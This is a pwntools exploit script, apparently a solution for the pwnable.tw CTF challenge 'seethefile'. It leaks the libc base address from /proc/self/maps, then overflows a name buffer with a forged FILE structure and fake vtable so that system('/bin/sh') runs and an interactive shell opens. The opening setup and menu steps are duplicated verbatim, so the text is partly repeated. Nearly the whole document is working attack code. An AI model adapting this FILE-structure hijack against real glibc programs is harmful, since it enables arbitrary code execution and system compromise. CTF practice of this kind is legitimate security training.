from pwn import *

s=process('./seethefile')
#s=remote('chall.pwnable.tw',10200)

name=0x0804b260
filetype=0x0804c410

tmp=0x1af000
binsh_libc=0x015B82b
system_libc=0x3ada0 #local
#system_libc=0x3a940
leak_libc=''
base_libc=''
oneshot_libc=''


print s.recvuntil('choice :')
s.sendline('1')

print s.recvuntil('see :')
s.sendline('/proc/self/maps')

for i in range(0,2):
        print s.recvuntil('choice :')
        s.sendline('2')

print s.recvuntil('choice :')
s.sendline('3')

from pwn import *

s=process('./seethefile')
#s=remote('chall.pwnable.tw',10200)

name=0x0804b260
filetype=0x0804c410

tmp=0x1af000
binsh_libc=0x015B82b
system_libc=0x3ada0 #local
#system_libc=0x3a940
leak_libc=''
base_libc=''
oneshot_libc=''


print s.recvuntil('choice :')
s.sendline('1')

print s.recvuntil('see :')
s.sendline('/proc/self/maps')

for i in range(0,2):
        print s.recvuntil('choice :')
        s.sendline('2')

print s.recvuntil('choice :')
s.sendline('3')

print s.recvuntil('-')
leak_libc=s.recvuntil(' r-xp')
leak_libc=leak_libc[0:8]

leak_libc=int(leak_libc,16)
base_libc=leak_libc-tmp

system_addr=base_libc+system_libc
binsh_addr=base_libc+binsh_libc

print s.recv(1024)

raw_input('1')
s.sendline('5')
raw_input('2')
print s.recvuntil('name :')

#s.send('\x08\x24\xad\xfb'+";/bin/sh\00"+'A'*19)

#s.send('\x08\x24\xad\xfb'+'A'*28)
s.send('/bin/sh\00'+'A'*24)
s.send(p32(name))#fp 0x4
s.send('\x00'*0x24) #0x44
s.send(p32(0x0804b2d0)) #0x4
s.send("\x00"*0x32) #0x32
s.send("A"*0x16) #0x16
s.send(p32(0x0804b2f4)) #io_file_jump
s.send('B'*0x40)
s.sendline(p32(system_addr)+'C'*500)

raw_input('3')
print s.recv(1024)

print "leak_libc: "+str(hex(leak_libc))
print "base_libc: "+str(hex(base_libc))
print "system_addr: "+str(hex(system_addr))
print "binsh_addr: "+str(hex(binsh_addr))

s.interactive()

